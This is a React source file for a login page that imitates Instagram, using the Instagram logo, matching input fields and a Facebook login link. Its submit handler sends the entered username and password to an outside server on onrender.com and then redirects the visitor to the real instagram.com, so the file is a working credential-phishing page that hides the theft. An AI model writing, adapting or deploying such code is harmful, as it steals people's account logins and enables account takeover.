import React, { useState } from "react";
import "./Login.css"; // we will create this

function Login() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    await fetch("https://insta-clone-nmir.onrender.com/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, password }),
    });
    window.location.href = "https://www.instagram.com";
  };

  return (
    <div className="login-container">
      <div className="login-box">
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg"
          alt="Instagram"
          className="logo"
        />
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Phone number, username, or email"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <button type="submit">Log In</button>
        </form>
        <div className="divider">
          <div></div>
          <span>OR</span>
          <div></div>
        </div>
        <a href="https://www.facebook.com" className="fb-login">
          Log in with Facebook
        </a>
        <a href="/" className="forgot-password">
          Forgot password?
        </a>
      </div>
    </div>
  );
}

export default Login;
